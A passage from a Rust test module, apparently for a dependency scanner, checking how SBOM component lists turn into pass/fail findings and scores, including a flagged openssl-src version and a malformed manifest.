        let findings = outcome.findings.as_array().unwrap();
        let hits: Vec<_> = findings
            .iter()
            .filter(|f| f["title"].as_str().unwrap().contains("openssl-src"))
            .collect();
        assert_eq!(hits.len(), 1, "only the 111.0.x row should match");
    }

    #[test]
    fn sbom_clean_manifest_passes() {
        let sbom = serde_json::json!({
            "components": [
                { "purl": "pkg:npm/leftpad@1.0.0" },
                { "purl": "pkg:cargo/serde@1.0.200" },
            ]
        });
        let mut outcome = clean_outcome();
        apply_sbom_findings(&mut outcome, &sbom);
        assert_eq!(outcome.status, "pass");
        assert_eq!(outcome.score, 100);
    }

    #[test]
    fn sbom_malformed_records_informational_finding() {
        let sbom = serde_json::json!({ "wrong_root": [] });
        let mut outcome = clean_outcome();
        apply_sbom_findings(&mut outcome, &sbom);
        // Score stays 100; we just note that we couldn't read it.
        assert_eq!(outcome.status, "pass");
        assert_eq!(outcome.score, 100);
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings
            .iter()
            .any(|f| f["title"].as_str().unwrap().contains("no 'components'")));
    }
}
